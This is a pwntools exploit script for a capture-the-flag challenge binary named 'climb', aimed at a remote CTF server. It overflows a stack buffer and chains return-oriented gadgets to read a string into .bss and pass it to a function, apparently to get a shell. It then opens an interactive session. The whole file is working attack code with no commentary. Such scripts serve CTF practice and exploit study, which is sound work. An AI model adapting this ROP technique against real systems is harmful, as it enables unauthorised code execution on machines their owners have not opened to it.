#!/usr/bin/env python

from pwn import *

BINARY = './climb'
LIBC = './libc-2.26.so'
HOST = 'cha.hackpack.club'
PORT = 41702

elf = ELF(BINARY)

context.terminal = ['tmux', 'split-w']


def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
	script = ""
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	gdb.attach(process(BINARY), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process([BINARY])
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)



p = start()
if args.GDB:
    gdb.attach(p, 'b system')

entry_count = 0

call_me = p64(0x400664)
#read_ptr = p64(0x0602020)

pop_rdx = p64(0x0000000000400654)
pop_rdi = p64(0x0000000000400743)
pop_rsi = p64(0x0000000000400741)# : pop rsi ; pop r15 ; ret
data = p64(0x0601040)
bss = p64(0x00601058)
read_ptr = p64(0x00400550)
system = p64(0x00400530)
ret = p64(0x00000000004004fe)

exploit = b"A"*32 + b"B"*8 

exploit += pop_rdx + p64(10)
exploit += pop_rsi
exploit += bss + b"JUNKJUNK"
exploit += pop_rdi
exploit += p64(0)
exploit += read_ptr

exploit += pop_rdi 
exploit += bss
exploit += pop_rsi
exploit += p64(0)
exploit += p64(0)
exploit += call_me
exploit += ret

p.sendlineafter("respond? ", exploit)

p.interactive()
